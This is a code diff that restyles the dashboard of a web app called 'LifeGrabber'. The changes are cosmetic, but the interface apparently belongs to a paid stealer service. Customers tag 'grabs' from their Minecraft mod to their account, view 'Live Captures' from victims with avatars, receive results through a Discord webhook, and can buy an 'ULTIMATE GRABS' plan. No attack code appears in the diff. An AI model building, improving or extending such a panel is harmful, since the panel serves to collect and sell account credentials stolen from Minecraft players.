@@ -5,8 +5,8 @@ import { useRouter } from 'next/navigation';
 
 const colors = {
   bg: '#050508',
-  panel: '#0d0d12',
-  border: '#1a1a22',
+  panel: 'rgba(13, 13, 18, 0.7)',
+  border: 'rgba(255,255,255,0.06)',
   text: '#f0f0f0',
   textDim: '#6b6e7b',
   green: '#22c55e',
@@ -14,11 +14,10 @@ const colors = {
 
 function NavItem({ icon, label, active, onClick }) {
   return (
-    <div onClick={onClick} style={{
+    <div onClick={onClick} className="btn-smooth" style={{
       display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
       background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
       color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
-      transition: 'all 0.2s ease',
     }}
     onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
     onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
@@ -60,7 +59,7 @@ function Dashboard({ userEmail }) {
   };
 
   return (
-    <div style={{ flex: 1, padding: '28px 36px' }}>
+    <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
       <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening.</h1>
       <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
       <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
@@ -69,7 +68,7 @@ function Dashboard({ userEmail }) {
           { icon: '💬', label: 'DISCORD', value: '—', sub: 'Webhook active' },
           { icon: '🌐', label: 'STATUS', value: '✓', sub: 'Online' },
         ].map((c, i) => (
-          <div key={i} style={{ background: colors.panel, borderRadius: 10, padding: '18px 20px', flex: 1, border: `1px solid ${colors.border}` }}>
+          <div key={i} className="glass-card" style={{ borderRadius: 10, padding: '18px 20px', flex: 1 }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: colors.textDim, fontSize: 12, marginBottom: 10 }}>
               <span style={{ fontSize: 14 }}>{c.icon}</span> {c.label}
             </div>
@@ -83,7 +82,7 @@ function Dashboard({ userEmail }) {
           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
             <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
           </div>
-          <div style={{ height: 200, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
+          <div className="glass-card" style={{ height: 200, borderRadius: 10, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
             <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
             <span style={{ fontSize: 13 }}>{grabCount === 0 ? 'No captures yet' : 'Check Grabs tab'}</span>
           </div>
@@ -92,7 +91,7 @@ function Dashboard({ userEmail }) {
           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
             <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Link Minecraft</span>
           </div>
-          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 16 }}>
+          <div className="glass-card" style={{ borderRadius: 10, padding: 16 }}>
             <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 10 }}>
               Enter your Minecraft username so grabs from your mod are tagged to your account.
             </div>
@@ -107,9 +106,9 @@ function Dashboard({ userEmail }) {
                   onChange={e => setMcUsername(e.target.value)}
                   onKeyDown={e => e.key === 'Enter' && handleSaveMc()}
                   placeholder="Minecraft username"
-                  style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none' }}
+                  style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none', transition: 'all 0.2s ease' }}
                 />
-                <button onClick={handleSaveMc} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Link</button>
+                <button onClick={handleSaveMc} className="btn-smooth" style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Link</button>
               </div>
             )}
           </div>
@@ -123,11 +122,11 @@ function Dashboard({ userEmail }) {
 
 function Plans() {
   return (
-    <div style={{ flex: 1, padding: '28px 36px' }}>
+    <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
       <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
       <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
       <div style={{ maxWidth: 400 }}>
-        <div style={{ background: colors.panel, border: `1px solid ${colors.green}`, borderRadius: 12, padding: 28, position: 'relative' }}>
+        <div className="glass-card" style={{ border: '1px solid rgba(34, 197, 94, 0.3)', borderRadius: 12, padding: 28, position: 'relative' }}>
           <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
           <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
           <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
@@ -137,7 +136,7 @@ function Plans() {
               <span style={{ color: colors.green }}>✓</span> {f}
             </div>
           ))}
-          <button disabled style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
+          <button disabled className="btn-smooth" style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
         </div>
       </div>
     </div>
@@ -222,7 +221,7 @@ function RepPage({ username, userEmail }) {
   };
 
   return (
-    <div style={{ flex: 1, padding: '28px 36px' }}>
+    <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
       <div style={{ marginBottom: 20 }}>
         <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>+Rep</h1>
         <p style={{ color: colors.textDim, fontSize: 14, margin: 0 }}>{reviews.length} reviews from users.</p>
@@ -230,16 +229,16 @@ function RepPage({ username, userEmail }) {
 
       {userEmail ? (
         myRep ? (
-          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
+          <div className="glass-card" style={{ borderRadius: 10, padding: 16, marginBottom: 20 }}>
             <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>You already posted a rep</div>
             <p style={{ fontSize: 13, color: colors.textDim, margin: 0 }}>You can edit or delete your existing rep below.</p>
           </div>
         ) : (
-          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
+          <div className="glass-card" style={{ borderRadius: 10, padding: 16, marginBottom: 20 }}>
             <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Add your rep</div>
             <div style={{ display: 'flex', gap: 8, marginBottom: 10 }}>
-              <button onClick={() => setNewTag('Good')} style={{ background: newTag === 'Good' ? colors.green : 'transparent', color: newTag === 'Good' ? '#000' : colors.textDim, border: `1px solid ${newTag === 'Good' ? colors.green : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👍 Good</button>
-              <button onClick={() => setNewTag('Bad')} style={{ background: newTag === 'Bad' ? '#ef4444' : 'transparent', color: newTag === 'Bad' ? '#fff' : colors.textDim, border: `1px solid ${newTag === 'Bad' ? '#ef4444' : colors.border}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👎 Bad</button>
+              <button onClick={() => setNewTag('Good')} className="btn-smooth" style={{ background: newTag === 'Good' ? colors.green : 'transparent', color: newTag === 'Good' ? '#000' : colors.textDim, border: `1px solid ${newTag === 'Good' ? colors.green : 'rgba(255,255,255,0.06)'}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👍 Good</button>
+              <button onClick={() => setNewTag('Bad')} className="btn-smooth" style={{ background: newTag === 'Bad' ? '#ef4444' : 'transparent', color: newTag === 'Bad' ? '#fff' : colors.textDim, border: `1px solid ${newTag === 'Bad' ? '#ef4444' : 'rgba(255,255,255,0.06)'}`, borderRadius: 6, padding: '6px 14px', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>👎 Bad</button>
             </div>
             <div style={{ display: 'flex', gap: 8 }}>
               <input
@@ -247,36 +246,36 @@ function RepPage({ username, userEmail }) {
                 onChange={e => setNewRep(e.target.value)}
                 onKeyDown={e => e.key === 'Enter' && handlePost()}
                 placeholder="Write a review..."
-                style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
+                style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', transition: 'all 0.2s ease' }}
               />
-              <button onClick={handlePost} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Confirm</button>
+              <button onClick={handlePost} className="btn-smooth" style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Confirm</button>
             </div>
           </div>
         )
       ) : (
-        <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20, textAlign: 'center', color: colors.textDim, fontSize: 13 }}>
+        <div className="glass-card" style={{ borderRadius: 10, padding: 16, marginBottom: 20, textAlign: 'center', color: colors.textDim, fontSize: 13 }}>
           Sign in to leave a review
         </div>
       )}
 
       <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
         {['Newest', 'Oldest', 'Good', 'Bad', 'Mine'].map((f) => (
-          <button key={f} onClick={() => setFilter(f)} style={{ background: filter === f ? colors.text : 'transparent', color: filter === f ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
+          <button key={f} onClick={() => setFilter(f)} className="btn-smooth" style={{ background: filter === f ? colors.text : 'transparent', color: filter === f ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
         ))}
       </div>
 
       <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
         {filtered.map((r) => (
-          <div key={r.id} style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: '16px 20px', position: 'relative' }}>
+          <div key={r.id} className="glass-card" style={{ borderRadius: 10, padding: '16px 20px', position: 'relative' }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
               <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{r.username}</span>
-              <span style={{ background: '#1a2a1a', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
+              <span style={{ background: 'rgba(34, 197, 94, 0.1)', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
               <span style={{ fontSize: 12, color: colors.textDim, marginLeft: 'auto' }}>{formatTime(r.created_at)}</span>
               {r.user_email === userEmail && (
                 <div style={{ position: 'relative' }}>
                   <span onClick={() => setMenuOpen(menuOpen === r.id ? null : r.id)} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 16, padding: '0 4px' }}>⋯</span>
                   {menuOpen === r.id && (
-                    <div style={{ position: 'absolute', top: '100%', right: 0, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: 6, zIndex: 10, minWidth: 100 }}>
+                    <div className="glass-card" style={{ position: 'absolute', top: '100%', right: 0, borderRadius: 8, padding: 6, zIndex: 10, minWidth: 100 }}>
                       <div onClick={() => handleEdit(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: colors.text, cursor: 'pointer', borderRadius: 4 }}>Edit</div>
                       <div onClick={() => handleDelete(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: '#ef4444', cursor: 'pointer', borderRadius: 4 }}>Delete</div>
                     </div>
@@ -286,8 +285,8 @@ function RepPage({ username, userEmail }) {
             </div>
             {editingId === r.id ? (
               <div style={{ display: 'flex', gap: 8 }}>
-                <input value={editText} onChange={e => setEditText(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSaveEdit(r.id)} style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 14, outline: 'none' }} />
-                <button onClick={() => handleSaveEdit(r.id)} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Save</button>
+                <input value={editText} onChange={e => setEditText(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSaveEdit(r.id)} style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 14, outline: 'none', transition: 'all 0.2s ease' }} />
+                <button onClick={() => handleSaveEdit(r.id)} className="btn-smooth" style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Save</button>
               </div>
             ) : (
               <p style={{ fontSize: 14, color: colors.text, margin: 0 }}>{r.text}</p>
@@ -392,7 +391,7 @@ function LiveCaptures() {
   const totalCaptures = grabs.reduce((s, g) => s + g.count, 0);
 
   return (
-    <div style={{ flex: 1, padding: '28px 36px' }}>
+    <div className="page-enter" style={{ flex: 1, padding: '28px 36px' }}>
       <div style={{ marginBottom: 20 }}>
         <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Live Captures</h1>
         <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{totalCaptures} captures from {grabs.length} users</p>
@@ -400,7 +399,7 @@ function LiveCaptures() {
 
       <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
         {grabs.map(g => (
-          <div key={g.minecraft_username} style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, padding: '14px 20px', display: 'flex', alignItems: 'center', gap: 14 }}>
+          <div key={g.minecraft_username} className="glass-card" style={{ borderRadius: 10, padding: '14px 20px', display: 'flex', alignItems: 'center', gap: 14 }}>
             <img src={'https://mc-heads.net/avatar/' + g.minecraft_username + '/40'} alt="" style={{ width: 40, height: 40, borderRadius: 8 }} />
             <div style={{ flex: 1 }}>
               <div style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</div>
@@ -479,9 +478,9 @@ export default function DashboardPage() {
 
   return (
     <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
-      <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'linear-gradient(180deg, #0a0a10 0%, #050508 100%)' }}>
+      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
-          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
+          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
           <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
         </div>
         <div style={{ flex: 1 }}>
